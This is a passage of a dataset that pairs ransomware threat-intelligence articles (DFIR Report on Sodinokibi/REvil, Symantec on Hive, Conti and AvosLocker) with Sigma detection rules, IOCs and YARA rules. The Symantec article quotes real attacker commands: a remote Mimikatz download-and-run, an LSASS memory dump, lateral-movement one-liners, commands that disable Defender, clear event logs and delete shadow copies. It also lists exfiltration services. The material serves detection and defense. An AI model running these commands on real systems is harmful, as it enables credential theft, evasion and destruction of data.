Provider\"\nSQLTELEMETRY$SQLEXPRESS\nVeeamHvIntegrationSvc\nAltiCTProxy\nMsDtsServer130\nViprePPLSvc\nMcAfeeFramework\nMSSQL$QM\n\"swi_service\"\n\"ThreadLocker\"\nofcservice\nAUService\nsophossps\nAzureADConnectHealthSyncMonitor\nAltaro.OffsiteServer.UI.Service.exe\n\"SAVAdminService\"\nds_monitor\nALTIVRM\nSSASTELEMETRY\nTmCCSF\nMsDtsServer110\n\"Sophos MCS Client\"\nTMBMServer\nSBAMSvc\nmfewc\n\"Sophos System Protection Service\"\nMSSQLFDLauncher$TESTBACKUP02DEV\nVeeamDeploymentService\nmasvc\nbackup\nMSSQL$SQLEXPRESS\nAltiPhoneServ\nMSSQLServerOLAPService\nSSISTELEMETRY130\nVeeamEndpointBackupSvc\nmepocs\nAltaro.UI.Service.exe\n\"ds_agent\"\nHuntressUpdater\nMSSQLFDLauncher\n\"Sophos File Scanner Service\"\nSQLAgent$MSGPMR\nADSync\nKaseyaAgent\nReportServer\nMSSQLFDLauncher$SQLEXPRESS\nMSSQL$HPWJA\nKaseyaAgentEndpoint\nVeeamTransportSvc\n\"ds_monitor\"\nmfevtp\nMSSQLTESTBACKUP02DEV\nSQLTELEMETRY$MSGPMR\nThreadLocker\nMSSQLServerADHelper100\nveeam\ntmlisten\nAzureADConnectHealthSyncInsights\n\"swi_filter\"\nMsDtsServer120\nProtectedStorage\nVeeamDeploySvc\nmemtas\nds_agent\nVeeamMountSvc\nHuntressAgent\nSQLAgent$SQLEXPRESS\nbedbg\nMSSQLSERVER\n\"ofcservice\"\nVipreAAPSvc\n\"Sophos Endpoint Defense Service\"\nKACHIPS906995744173948\nDsSvc\nMSSQLLaunchpad$SQLEXPRESS\nmsseces\nmacmnsvc\nLTService\nCode42Service\nAltaro.HyperV.WAN.RemoteService.exe\nLTSvcMon\nMSSQL$SQLEXPRESSADV\n\"SAVService\"\nAltaro.OffsiteServer.Service.exe\n\"Sage 100cloud Advanced 2020 (9920)\"\nAltaro.SubAgent.exe\nmfemms\n\"TeamViewer\"\n\"SQLServer Reporting Services (MSSQLSERVER)\"\nVSS\nsql\nAltaro.SubAgent.N2.exe\n\"SQLServer Integration Services 12.0\"\nSQLSERVERAGENT\nvss\n\"Sophos Safestore Service\"\nklnagent\n\"Sage.NA.AT_AU.Service\"\nMBAMService\n\"Sophos Health Service\"\nSQLBrowser\nMySQL\n\"ProtectedStorage\"\n\"Sophos Clean Service\"\n\"Sage 100c Advanced 2017 (9917)\"\n\"SntpService\"\nVeeamNFSSvc\nKAVFS\nSQLEXPRESSADV\nKAENDCHIPS906995744173948\nsppsvc\nAmsp\npsqlWGE\nMicrosoft.exchange.store.worker.exe\nkavfsscs\n\"Amsp\"\nsqlservr\nAltaro.DedupService.exe\nsvc$\n\"ds_notifier\"\n\"Sophos Device Control Service\"\nAzureADConnectAgentUpdater\nAltiFTPUploader\n\"Sophos MCS Agent\"\n```\n\nTriage sandbox run of the executable without smode:\n\n```image\nAlt: Triage Sandbox\nDescription: The image displays a detailed dashboard or report related to the Sodinokibi (REvil) ransomware, focusing on various signatures and processes associated with it. It features a list of signatures categorized by their effects, such as 'Collection,' 'Credential Access,' 'Defense Evasion,' 'Discovery,' 'Impact,' and 'Persistence.' The signature for the Sodinokibi ransomware is highlighted in red, indicating a significant impact. Additionally, the image lists specific processes, including their file paths, relevant to the ransomware's execution and behavior on the compromised system.\nTranscription: |\n  # Signatures\n  Filter: none\n  - Sodin,Sodinokibi,REvil\n  - Modifies extensions of user files\n  - Reads user/profile data of web browsers\n  - Adds Run key to start application\n  - Enumerates connected drives\n  - Sets desktop wallpaper using registry\n  - Drops file in Program Files directory\n  - Suspicious behavior: EnumeratesProcesses\n  - Suspicious use of AdjustPrivilegeToken\n  \n  # Processes\n  - C:\\Users\\Admin\\AppData\\Local\\Temp\\DomainName.exe\n    - Modifies extensions of user files\n    - Adds Run key to start application\n    - Enumerates connected drives\n    - Drops file in Program Files directory\n    - Suspicious behavior: EnumeratesProcesses\n    - Suspicious use of AdjustPrivilegeToken\n  \n  - C:\\Windows\\system32\\wbem\\unsecapp.exe\n  - C:\\Windows\\system32\\svsvc.exe\n```\n\n### IOCs\n\n#### Network\n\n```\n45.86.163.78|80\n45.86.163.78|443\n45.86.163.78|8080\n195.189.99.74|80\n195.189.99.74|443\n195.189.99.74|8080\n206.189.10.247|80\n161.35.109.168|443\nsmalleststores.com\ncloudmetric.online\ncikawemoret34.space\nnomovee.website\n```\n\n#### File\n\n```\nskull-x64.dat\n5c3a6978bb960d8fbccd117ddcc3ca10\n17424cfeb756e231bea6d1363151a83af142ba6f\n59a2a5fae1c51afbbf1b8c6eb0a65cb2b8575794e3890f499f8935035e633fc\nCiocca.dll\n296f1098a3a8cfb7e07808ee08361495\n7d903f87fd305f1c93ec420848fd6e5aeb018d59\nb1b00f7b065e8c013e0c23c0f34707819e0d537dbe2e83d0d023a11a0ca6b388\nlicense.dat\n6f208841cfd819c29a7cbc0a202bd7a3\n0febc376cc066bb668f1a80b969ed112da8e871c\n45b6349ee9d53278f350b59d4a2a28890bbe9f9de6565453db4c085bb5875865\nDomainName.dll\nc8fab46c4fd61c5f138fb151638c35e1\nc4830cbf3a3044f6e50cd60127ff5681f8ee4bbf\n64076294e761cee0ce7d7cd28dae05f483a711eafe47f94fe881ac3980abfd8f\nDomainName.exe\naf94ccb62f97700115a219c4b7626d22\nbb67edcfe4e5b6fe09ee96e5b8ace7a4cfe39eb7\n2896b38ec3f5f196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c\nsvchost.exe (rclone)\nfcfcf1e45e8d5cdca0450b8dc90754b68e8e4673\n538078ab6d80d7cf889af3e08f62c4e83358596f31ac8ae8fbc6326839a6bfe5\nAdFind.exe\ncb198869ca3c96af536869e71c54dd9d83afbee6\n56de41fa0a94fa7fff68f02712a698ba2f0a71afcecb217f6519bd5751baf3ed\n```\n\n### Detections\n\n#### Network\n\n```\nETPRO TROJAN Cobalt Strike Malleable C2 JQuery Custom Profile M2\nET DNS Query to a *.top domain\nET POLICY OpenSSL Demo CA - Internet Widgits Pty\n```\n\n#### Sigma\n\n- Suspicious PowerShell Encoded Command\n- Trickbot Recon Activity\n- Suspicious Commands Recon Activity\n- Rundll32 Net Connections\n- BITSAdmin Download\n- Suspicious AdFind\n- Suspicious WMI Execution\n- Office Shell\n\nCustom rule thanks to @0xThiebaut:\n\n```\ntitle: Sodinokibi Ransomware Registry Key\nid: 9fecd354-77f0-498e-a611-c963970e7bca\ndescription: Detects the creation of Sodinokibi (aka REvil) registry keys\nstatus: experimental\nreferences:\n  - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\n  - https://twitter.com/malwrhunterteam/status/1372648463553462279\ntags:\n  - attack.persistence\n  - attack.t1547.001\ndate: 2021/03/29\nauthor: Maxime THIEBAUT (@0xThiebaut)\nlogsource:\n  category: registry_event\n  product: windows\ndetection:\n  selection:\n    TargetObject|contains:\n      - '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*AstraZeneca'\n      - '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*franceisshit'\ncondition: selection\nlevel: high\n```\n\nCustom rule thanks to @lindodapoet_:\n\n```\ntitle: Svchost data exfiltration\nid: dc4249c9-d96f-401b-a92b-caa6208c097d\nstatus: experimental\ndescription: Detects possible data exfiltration via svchost\nreferences:\n  - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\nauthor: Nclose\ndate: 2021/03/29\ntags:\n  - attack.exfiltration\n  - attack.t1048\nlogsource:\n  product: windows\n  service: process_creation\ndetection:\n  selection:\n    CommandLine|contains: 'copy'\n    Image|endswith: '\\svchost.exe'\ncondition: selection\nfalsepositives:\n  - Unknown\nlevel: high\n```\n\n### Custom rules and rule ideas_Ransomware.yaml) written by @BlackMatter23.\n\n### Yara\n\n```\n/*\nYARA Rule Set\nAuthor: The DFIR Report\nDate: 2021-03-29\nIdentifier: files\nReference: https://thedfirreport.com\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nimport \"pe\"\n\nrule Sodinokibi_032021 {\nmeta:\n  description = \"files - file DomainName.exe\"\n  author = \"The DFIR Report\"\n  reference = \"https://thedfirreport.com\"\n  date = \"2021-03-21\"\n  hash1 = \"2896b38ec3f5f196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c\"\nstrings:\n  $s1 = \"vmcompute.exe\" fullword wide\n  $s2 = \"vmwp.exe\" fullword wide\n  $s3 = \"bootcfg /raw /a /safeboot:network /id 1\" fullword ascii\n  $s4 = \"bcdedit /set {current} safeboot network\" fullword ascii\n  $s5 = \"7+a@P>:N:0!F$%I-6MBEFb M\" fullword ascii\n  $s6 = \"jg:\\\"\\\\0=Z\" fullword ascii\n  $s7 = \"ERR0R D0UBLE RUN!\" fullword wide\n  $s8 = \"VVVVVPQ\" fullword ascii\n  $s9 = \"VVVVVWQ\" fullword ascii\n  $s10 = \"Running\" fullword wide /* Goodware String - occured 159 times */\n  $s11 = \"expand 32-byte kexpand 16-byte k\" fullword ascii\n  $s12 = \"9RFIT\\\"&\"\n  $s13 = \"jZXVf9F\" fullword ascii\n  $s14 = \"tCWWWhS=@\" fullword ascii\n  $s15 = \"vmms.exe\" fullword wide /* Goodware String - occured 1 times */\n  $s16 = \"JJwK9Zl\" fullword ascii\n  $s17 = \"KkT37uf4nNh2PqUDwZqxcHUMVV3yBwSHO#K\" fullword ascii\n  $s18 = \"0*090}0\" fullword ascii /* Goodware String - occured 1 times */\n  $s19 = \"5)5I5a5\" fullword ascii /* Goodware String - occured 1 times */\n  $s20 = \"7-7H7c7\" fullword ascii /* Goodware String - occured 1 times */\ncondition:\n  uint16(0) == 0x5a4d and filesize < 400KB and\n  ( pe.imphash() == \"031931d2f2d921a9d906454d42f21be0\" or 8 of them )\n}\n\nrule icedid_032021_1 {\nmeta:\n  description = \"files - file skull-x64.dat\"\n  author = \"The DFIR Report\"\n  reference = \"https://thedfirreport.com\"\n  date = \"2021-03-21\"\n  hash1 = \"59a2a5fae1c51afbbf1bf8c6eb0a65cb2b8575794e3890f499f8935035e633fc\"\nstrings:\n  $s1 = \"update\" fullword ascii /* Goodware String - occured 207 times */\n  $s2 = \"PstmStr\" fullword ascii\n  $s3 = \"mRsx0k/\" fullword wide\n  $s4 = \"D$0lzK\" fullword ascii\n  $s5 = \"A;Zts}H\" fullword ascii\ncondition:\n  uint16(0) == 0x5a4d and filesize < 100KB and\n  ( pe.imphash() == \"67a065c05a359d287f1fed9e91f823d5\" and ( pe.exports(\"PstmStr\") and pe.exports(\"update\") ) or all of them )\n}\n\nrule icedid_032021_2 {\nmeta:\n  description = \"1 - file license.dat\"\n  author = \"The DFIR Report\"\n  reference = \"https://thedfirreport.com\"\n  date = \"2021-03-21\"\n  hash1 = \"45b6349ee9d53278f350b59d4a2a28890bbe9f9de6565453db4c085bb5875865\"\nstrings:\n  $s1 = \"+ M:{`n-\" fullword ascii\n  $s2 = \"kwzzdd\" fullword ascii\n  $s3 = \"w5O- >z\" fullword ascii\n  $s4 = \"RRlK8n@~\" fullword ascii\ncondition:\n  uint16(0) == 0x43da and filesize < 1000KB and\n  8 of them\n}\n```\n\n### MITRE\n\n```\nSpearphishing Attachment - T1566.001\nUser Execution - T1204\nWindows Management Instrumentation - T1047\nProcess Injection - T1055\nDomain Trust Discovery - T1482\nDomain Account - T1087.002\nSystem Information Discovery - T1082\nSystem Network Configuration Discovery - T1016\nSecurity Software Discovery - T1518.001\nSMB/Windows Admin Shares - T1021.002\nRemote Desktop Protocol - T1021.001\nCommonly Used Port - T1043\nApplication Layer Protocol - T1071\nExfiltration Over Asymmetric Encrypted Non-C2 Protocol - T1048.002\nData Encrypted for Impact - T1486\nMalicious File - T1204.002\nCommand and Scripting Interpreter - T1059\nPowerShell - T1059.001\nScheduled Task - T1053.005\nRemote System Discovery - T1018\nRundll32 - T1218.011\n```",
    "sigma_rule": {
      "title": "Suspicious WMIC Execution Via Office Process",
      "id": "e1693bc8-7168-4eab-8718-cdcaa68a1738",
      "related": [
        {
          "id": "438025f9-5856-4663-83f7-52f878a70a50",
          "type": "derived"
        },
        {
          "id": "518643ba-7d9c-4fa5-9f37-baed36059f6a",
          "type": "obsolete"
        },
        {
          "id": "9d1c72f5-43f0-4da5-9320-648cf2099dd0",
          "type": "obsolete"
        },
        {
          "id": "c0e1c3d5-4381-4f18-8145-2583f06a1fe5",
          "type": "obsolete"
        },
        {
          "id": "04f5363a-6bca-42ff-be70-0d28bf629ead",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Office application called wmic to proxye execution through a LOLBIN process. This is often used to break suspicious parent-child chain (Office app spawns LOLBin).",
      "references": [
        "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
        "https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml"
      ],
      "author": "Vadim Khrykov, Cyb3rEng",
      "date": "2021-08-23",
      "modified": "2023-02-14",
      "tags": [
        "attack.t1204.002",
        "attack.t1047",
        "attack.t1218.010",
        "attack.execution",
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": [
            "\\WINWORD.EXE",
            "\\EXCEL.EXE",
            "\\POWERPNT.exe",
            "\\MSPUB.exe",
            "\\VISIO.exe",
            "\\MSACCESS.EXE",
            "\\EQNEDT32.EXE",
            "\\ONENOTE.EXE",
            "\\wordpad.exe",
            "\\wordview.exe"
          ]
        },
        "selection_wmic_img": [
          {
            "Image|endswith": "\\wbem\\WMIC.exe"
          },
          {
            "OriginalFileName": "wmic.exe"
          }
        ],
        "selection_wmic_cli": {
          "CommandLine|contains|all": [
            "process",
            "create",
            "call"
          ],
          "CommandLine|contains": [
            "regsvr32",
            "rundll32",
            "msiexec",
            "mshta",
            "verclsid",
            "wscript",
            "cscript"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_susp_execution_via_office_process.yml",
    "id": "678"
  },
  {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker",
    "markdown": "# Ransomware: How Attackers are Breaching Corporate Networks\n\n## Latest tools, tactics, and procedures being used by the Hive, Conti, and AvosLocker ransomware operations.\n\nTargeted ransomware attacks continue to be one of the most critical cyber risks facing organizations of all sizes. The tactics used by ransomware attackers are continually evolving, but by identifying the most frequently employed tools, tactics, and procedures (TTPs) organizations can gain a deeper understanding into how ransomware groups infiltrate networks and use this knowledge to identify and prioritize areas of weakness.\n\nSymantec, a division of Broadcom Software, tracks various ransomware threats; however, the following three ransomware families are being observed in the majority of recent attacks:\n\n- Hive\n- Conti\n- Avoslocker\n\nSimilar to many other ransomware families, Hive, Conti, and Avoslocker follow the ransomware-as-a-service (RaaS) business model. In the RaaS model the ransomware operators hire affiliates who are responsible for launching the ransomware attacks on their behalf. In most cases affiliates stick to a playbook that contains detailed attack steps laid out by the ransomware operators.\n\nOnce initial access to a victim network has been gained, Hive, Conti, and Avoslocker use a plethora of TTPs to help the operators achieve the following:\n\n- Gain persistence on the network\n- Escalate privileges\n- Tamper with and evade security software\n- Laterally move across the network\n\n### Initial Access\n\nAffiliates for the Hive, Conti, and Avoslocker ransomware operators use a variety of techniques to gain an initial foothold on victim networks. Some of these techniques include:\n\n- Spear phishing leading to the deployment of malware, including but not limited to:\n  - IcedID\n  - Emotet\n  - QakBot\n  - TrickBot\n- Taking advantage of weak RDP credentials\n- Exploiting vulnerabilities such as:\n  - Microsoft Exchange vulnerabilities - CVE-2021-34473, CVE-2021-34523, CVE-2021-31207, CVE-2021-26855\n  - FortiGate firewall vulnerabilities - CVE-2018-13379 and CVE-2018-13374\n  - Apache Log4j vulnerability - CVE-2021-44228\n\nIn most cases, the spear-phishing emails contain Microsoft Word document attachments embedded with macros that lead to the installation of one of the previously mentioned malware threats. In some instances, attackers use this malware to install Cobalt Strike, which is then used to pivot to other systems on the network. These malware threats are then used to distribute ransomware onto compromised computers.\n\n### Persistence\n\nAfter gaining initial access, Symantec has observed affiliates for all three ransomware families using third-party software such as AnyDesk and ConnectWise Control (previously known as ScreenConnect) to maintain access to victim networks. They also enable default Remote Desktop access in the firewall:\n\n```\nnetsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes\n```\n\nActors are also known to create additional users on compromised systems to maintain access. In some instances we have seen threat actors add registry entries that allow them to automatically log in when a machine is restarted:\n\n```\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d <user> /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_SZ /d 1 /f\n```\n\n### Discovery\n\nDuring the discovery phase the ransomware actors try to sweep the victim’s network to identify potential targets. Symantec has observed the aforementioned ransomware actors using tools such as the following:\n\n- ADRecon - Gathers Active Directory information and generates a report\n- Netscan - Discovers devices on the network\n\n### Credential Access\n\nMimikatz is a go-to tool for most ransomware groups and Hive, Conti, and Avoslocker are no exception. We have observed them using the PowerShell version of Mimikatz as well as the PE version of the tool. There are also instances where the threat actors directly load the PowerShell version of Mimikatz from GitHub repositories:\n\n```\npowershell IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/<redacted>/Invoke-Mimikatz.ps1'));Invoke-Mimikatz -DumpCreds\n```\n\nIn addition to using Mimikatz, the threat actors have also taken advantage of the native rundll32 and comsvcs.dll combination to dump the LSASS memory:\n\n```\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <process id> lsass.dmp full\n```\n\nAdversaries also dump the SECURITY, SYSTEM, and SAM hives and later extract credentials from the dump. In rare occasions they have also been observed using taskmgr.exe to dump the LSASS memory and later using the dump to extract valuable credentials.\n\n### Lateral Movement\n\nAttackers employ tools like PsExec, WMI, and BITSAdmin to laterally spread and execute the ransomware on victim networks. We have also observed the attackers using several other techniques to laterally move across networks.\n\n- PsExec\n```\npsexec -accepteula @ips.txt -s -d -c CSIDL_WINDOWS\\xxx.exe\n```\n\n- WMI\n```\nwmic /node:@C:\\share$\\comps1.txt /user:\"user\" /password:\"password\" process call create \"cmd.exe /c bitsadmin /transfer xxx \\\\IP\\share$\\xxx.exe %APPDATA%\\xxx.exe&%APPDATA%\\xxx.exe\"\n```\n\n- BITSAdmin\n```\nbitsadmin /transfer debjob /download /priority normal hxxp://<IP>/ele.dll CSIDL_WINDOWS\\ele.dll\n```\n\n- Mimikatz\n```\nmimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm hash>\"\n```\n\n### Defense Evasion\n\nAs with a number of other ransomware families, Hive, Conti, and Avoslocker also tamper with various security products that interfere with their goal. We have observed them meddling with security services using the net, taskkill, and sc commands to disable or terminate them. In some cases they also use tools like PC Hunter to end processes. They have also been seen tampering with various registry entries related to security products, since changes to the registry entries can make those products inoperative.\n\nBoth Hive and AvosLocker have been observed attempting to disable Windows Defender using the following reg.exe commands.\n\n**AvosLocker:**\n```\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f\n```\n\n**Hive:**\n```\nreg.exe delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f\nreg.exe add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f\nreg.exe add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f\nreg.exe delete aHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run” /v “Windows Defender” /f\nreg.exe delete “HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” /v “Windows Defender” /\n```\n\nDisabling the default Windows firewall is also one of the techniques we have seen being used by these ransomware families:\n\n```\nnetsh advfirewall set allprofiles state off\n```\n\nTo cover their tracks on a victim system the actors may also clear the Windows event log:\n\n```\nwevtutil.exe cl system\nwevtutil.exe cl security\nwevtutil.exe cl application\npowershell -command \"Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }\"\n```\n\n### Impact\n\nAdversaries tend to disable or tamper with operating system settings in order to make it difficult for administrators to recover data. Deleting shadow copies is a common tactic threat actors perform before starting the encryption process. They perform this task by using tools like Vssadmin or WMIC and running one of the following commands:\n\n```\nvssadmin.exe delete shadows /all /quiet\nwmic.exe shadowcopy delete\n```\n\nWe have also seen BCDEdit being used to disable automatic system recovery and to ignore failures on boot:\n\n```\nbcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\nbcdedit.exe /set {default} recoveryenabled no\n```\n\nIn some instances the actors delete the safe mode settings in the registry to stop security product services from starting in safe mode:\n\n```\nreg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\<service> /f\n```\n\n### Exfiltration\n\nAttackers commonly exfiltrate critical data from a victim’s environment before encrypting it. They then use the stolen data in an attempt to extort a ransom from victims. We have observed threat actors using the following cloud services to exfiltrate data:\n\n- https://anonfiles.com\n- https://mega.nz\n- https://send.exploit.in\n- https://ufile.io\n- https://www.sendspace.com\n\nWe have also seen attackers use the following tools for data exfiltration:\n\n- Filezilla\n- Rclone\n\n### Conclusion\n\nThe TTPs outlined in this blog are a snapshot of the current ransomware threat landscape. The TTPs used by these threat actors are constantly evolving, with groups continually tweaking their methods in a bid to outmaneuver their targets’ security defenses. As such, organizations need to be vigilant and employ a multi-layered security approach.\n\n### Symantec Protection\n\nSymantec Endpoint Protection (SEP) protects against ransomware attacks using multiple static and dynamic technologies.\n\n#### AV Protection\n\n- Ransom.Hive\n- Ransom.Conti\n- Ransom.AvosLocker\n- Backdoor.Cobalt\n- Hacktool.Mimikatz\n- Trojan.IcedID*\n- Trojan.Emotet*\n- W32.Qakbot*\n- Trojan.Trickybot*\n\n#### Behavioral Protection\n\n- SONAR.RansomHive!g2\n- SONAR.RansomHive!g3\n- SONAR.RansomHive!g4\n- SONAR.RansomAvos!g2\n- SONAR.RansomConti!g1\n- SONAR.RansomConti!g3\n- SONAR.RansomConti!g4\n- SONAR.Ransomware!g30\n- SONAR.RansomGregor!g1\n- SONAR.SuspLaunch!gen4\n- SONAR.SuspLaunch!g18\n- SONAR.Ransom!gen59\n- SONAR.Ransomware!g26\n- SONAR.Cryptlck!g171\n\n#### Intrusion Prevention System (IPS) detections\n\nIPS blocks initial access, persistence, and lateral movement. SEP's Audit Signatures are intended to raise awareness of potentially unwanted traffic on the network. By default, Audit Signatures do not block. Administrators reviewing the logs of IPS events in their network can note these Audit events and decide whether or not to configure the corresponding Audit Signatures to block the traffic.\n\nThe following is a list of Audit Signatures that can be enabled to block, through policies, activity related to the use of software or tools such as AnyDesk, ScreenConnect, and PsExec.\n\n- [33211 [Audit: AnyDesk Remote Desktop Activity]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33211)\n- [33156 [Audit: ScreenConnect Remote Support Software Activity]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33156)\n- [30068 [Audit: PSExec Utility Activity]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=30068)\n- [33588 [Audit: WMIC Remote RPC Interface Bind Attempt]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33588)\n- [33311 [Audit: PCHunter Tool Activity]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33331)\n- [33295 [Attack: Ransom.Conti Activity 3]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33295)\n- [33435 [Attack: Ransom.AvosLocker Activity 3]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33435)\n- [33444 [Attack: Ransom.AvosLocker Activity 4]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33444)\n- [32436 [Attack: Ransom.Gen Activity 29]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=32436)\n- [33323 [Attack: Ransom.Hive Activity]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33323)\n- [33119 [Audit: RClone Tool Activity]](https://www.broadcom.cn/support/security-center/attacksignatures/detail?asid=33119)\n\nSymantec recommends that you have intrusion prevention enabled on all your devices including servers.\n\n#### Adaptive Protection\n\nSymantec Adaptive Protection can help protect against lateral movement and ransomware execution techniques used by an attacker. If you are not using tools like PsExec, WMIC, and BITSAdmin in your environment then you should “Deny” these applications and actions using Symantec Adaptive Protection policies.",
    "sigma_rule": {
      "title": "Suspicious Process Created Via Wmic.EXE",
      "id": "3c89a1e8-0fba-449e-8f1b-8409d6267ec8",
      "related": [
        {
          "id": "526be59f-a573-4eea-b5f7-f0973207634d",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects WMIC executing \"process call create\" with suspicious calls to processes such as \"rundll32\", \"regsrv32\", etc.",
      "references": [
        "https://thedfirreport.com/2020/10/08/ryuks-return/",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2020-10-12",
      "modified": "2023-02-14",
      "tags": [
        "attack.execution",
        "attack.t1047"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "process ",
            "call ",
            "create "
          ],
          "CommandLine|contains": [
            "rundll32",
            "bitsadmin",
            "regsvr32",
            "cmd.exe /c ",
            "cmd.exe /k ",
            "cmd.exe /r ",
            "cmd /c ",
            "cmd /k ",
            "cmd /r ",
            "powershell",
            "pwsh",
            "certutil",
            "cscript",
            "wscript",
            "mshta",
            "\\Users\\Public\\",
            "\\Windows\\Temp\\",
            "\\AppData\\Local\\",
            "%temp%",
            "%tmp%",
            "%ProgramData%",
            "%appdata%",
            "%comspec%",
            "%localappdata%"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_wmic_susp_process_creation.yml",
    "id": "681"
  },
  {
    "url": "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
    "markdown": "# Sodinokibi (aka REvil) Ransomware\n\n**Categories:**\nadfind\ncobaltstrike\nicedid\nransomware\nrevil\nSodinokibi\n\n**Published on:** March 29, 2021\n\n### Intro\n\nSodinokibi (aka REvil) has been one of the most prolific ransomware as a service (RaaS) groups over the last couple years. The ransomware family was purported to be behind the Travelex intrusion and current reports point to an attack against Acer for a reported $50 million ransom demand.\n\nIn March, we observed an intrusion which started with malicious spam that dropped IcedID (Bokbot) into the environment and subsequently allowed access to a group distributing Sodinokibi ransomware. During the intrusion the threat actors escalated privileges to Domain Administrator, exfiltrated data, and used Sodinokibi to ransom all domain joined systems.\n\n### Case Summary\n\nThe IcedID trojan was first discovered in 2017 and currently operates as an initial access broker for several ransomware families. In our intrusion, the threat actors leveraged malicious spam using an xlsm document which, upon opening and enabling the macro, initiated a wmic command to execute the IcedID trojan from a remote executable posing as a GIF image.\n\nPersistence was setup using a scheduled task and discovery commands were initiated from the malware within minutes of execution. About an hour and a half after initial access, the malware pulled down Cobalt 